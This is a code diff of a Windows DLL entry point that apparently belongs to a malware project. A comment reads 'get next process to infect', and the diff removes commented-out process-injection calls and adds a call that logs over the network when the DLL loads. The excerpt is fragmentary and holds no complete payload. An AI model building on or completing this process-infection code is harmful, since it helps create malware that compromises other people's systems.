@@ -2,6 +2,7 @@
 #include "stdafx.h"
 #include "Common.h"
 #include "logger.h"
+#include "networking.h"
 
 DWORD WINAPI ThreadMain(LPVOID lpParameter)
 {
@@ -22,33 +23,12 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
 	// get next process to infect
 
 	int next_process_id = 0;
+	char *message = "Entered DLLMain | ";
+	SwineNetworking::Networking::logNetworking(message, strlen(message));
 	if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
 		int current_process_id = GetCurrentProcessId();
-		//next_process_id = MyInjecteeFuncs::getNextProcessID(current_process_id);
-
-		/*DisableThreadLibraryCalls(hInst); */
 		DWORD  dwThreadId;
-
-
-		HANDLE hThread = CreateThread(
-			NULL, 0, ThreadMain, NULL, 0, &dwThreadId); 
-
-		
-	
-
-		//logger();
-
-	
-		
-
-		//CreateThread(NULL, 0, Foo::MyThreadFunction, foo, 0L, NULL);
-
-
-		//if (next_process_id != 0) { 
-			//MyInjecteeFuncs::inject(next_process_id);
-		//}
-		// address of write file 77E311CC
-
+		HANDLE hThread = CreateThread(NULL, 0, ThreadMain, NULL, 0, &dwThreadId); 
 	} 
 
 	// This is the last process don't unload.
